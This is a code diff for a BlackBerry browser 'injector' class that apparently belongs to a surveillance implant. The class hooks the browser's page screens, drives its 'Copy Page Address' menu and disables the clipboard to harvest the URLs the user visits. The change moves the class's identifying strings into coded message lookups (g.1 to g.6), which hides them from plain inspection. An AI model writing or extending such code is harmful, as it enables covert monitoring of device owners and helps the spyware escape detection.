@@ -12,6 +12,7 @@ package blackberry.injection.injectors;
 import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import blackberry.Device;
+import blackberry.Messages;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.BrowserMenu;
@@ -28,20 +29,20 @@ public class BrowserInjector extends UrlGroupInjector {
     private Object lastUrl;
 
     public String getAppName() {
-        //TODO: in messages
-        return "Browser";
+        //g.1=Browser
+        return Messages.getString("g.1");
     }
 
     public String getCodName() {
-        //TODO: in messages
-        return "net_rim_bb_browser_daemon";
+        //g.2
+        return Messages.getString("g.2");
     }
 
     public String[] getWantedScreen() {
-        //TODO: in messages
+        //g.3, g.4
         return new String[] {
-                "net.rim.device.apps.internal.browser.page.BrowserScreen",
-                "net.rim.device.apps.internal.browser.ui.BrowserScreen" };
+                Messages.getString("g.3"),
+                Messages.getString("g.4") };
     }
 
     public void playOnScreen(Screen screen) {
@@ -57,8 +58,8 @@ public class BrowserInjector extends UrlGroupInjector {
     }
 
     public void urlByContext(Screen screen) {
-        //TODO: in messages
-        String menuName = "Copy Page Address";
+        //g.5
+        String menuName = Messages.getString("g.5");
         BrowserMenu menu = new BrowserMenu(this, menuName);
         menu.addMenu();
         boolean ret = MenuWalker.walk(menuName, screen, true);
@@ -74,8 +75,8 @@ public class BrowserInjector extends UrlGroupInjector {
         debug.trace("playOnScreen: " + screen);
         //#endif    
 
-        //TODO: in messages
-        String[] menuName = new String[] { "Copy Page Address", "Copy Address" };
+        //g.5, g.6
+        String[] menuName = new String[] { Messages.getString("g.5"), Messages.getString("g.6") };
 
         disableClipboard();
         boolean ret = MenuWalker.walk(menuName, screen, true);
